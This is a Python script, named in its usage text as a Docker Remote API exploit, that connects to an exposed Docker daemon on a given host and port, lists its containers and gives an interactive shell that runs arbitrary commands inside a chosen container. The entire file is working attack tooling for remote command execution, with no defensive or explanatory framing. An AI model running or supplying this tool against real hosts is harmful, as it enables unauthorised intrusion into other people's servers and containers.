import requests
import json
import sys
import os
import shlex


def get_containers(url) -> list:
    resp = requests.get(url)
    containers = json.loads(resp.text)
    return containers


def command_help(docker_remote_url, *args):
    s = ""
    s += "\t?\tShow help\n"
    s += "\texec\tRun a command in container: exec container_Id\n"
    s += "\tlc\tList containers\n"
    s += "\texit,q\tExit\n"
    print(s)


def command_lict_containers(docker_remote_url, *args):
    """
    List containers
    Args:
        docker_remote_url: str
    """
    containers = get_containers(f"{docker_remote_url}/containers/json")
    idx = 0
    for c in containers:
        print(f"[{idx}]", end=' ')
        print(json.dumps(c, sort_keys=True, indent=4))
        idx += 1



def command_exec(docker_remote_url, *args):
    """
    Run a shell in the container
    Args:
        docker_remote_url: str
        *args: (id,)
    """
    if len(args) < 1:
        print("Usgae: exec container_Id")
        return

    container_id = args[0]
    while True:
        inp_cmd = input("# ")
        if inp_cmd == "exit":
            break
        if inp_cmd == "":
            continue

        docker_exec = requests.post(f"{docker_remote_url}/containers/{container_id}/exec", json={
            "AttachStdin": False,
            "AttachStdout": True,
            "AttachStderr": True,
            "DetachKeys": "ctrl-p,ctrl-q",
            "Tty": False,
            "Cmd": [
                "sh", "-c", inp_cmd
            ]
        })
        exec_id = json.loads(docker_exec.text)['Id']
        docker_exec_start = requests.post(f"{docker_remote_url}/exec/{exec_id}/start", json={
            "Detach": False,
            "Tty": False,
            "ConsoleSize": [
                100, 100
            ]
        })
        print(docker_exec_start.text)


def command_exit(docker_remote_url, *args):
    exit(0)


command_funcs = {
    "?": command_help,
    "lc": command_lict_containers,
    "exec": command_exec,
    "exit": command_exit,
    "q": command_exit,
}


def command_loop(docker_remote_url):
    while True:
        inp_cmd = input("> ")
        inp_cmds = shlex.split(inp_cmd)
        if len(inp_cmds) < 1:
            continue
        command_funcs[inp_cmds[0]](docker_remote_url, *inp_cmds[1:])


def main():
    if len(sys.argv) != 3:
        print('Usage:\n\tpython DockerRemoteApiExploit.py host port\nExample:\n\tpython DockerRemoteApiExploit.py www.example.com 2375')
        return
    print("Input ? to show help.")
    host = sys.argv[1]
    port = sys.argv[2]
    docker_remote_url = f"http://{host}:{int(port)}"
    command_loop(docker_remote_url)


if __name__ == '__main__':
    main()
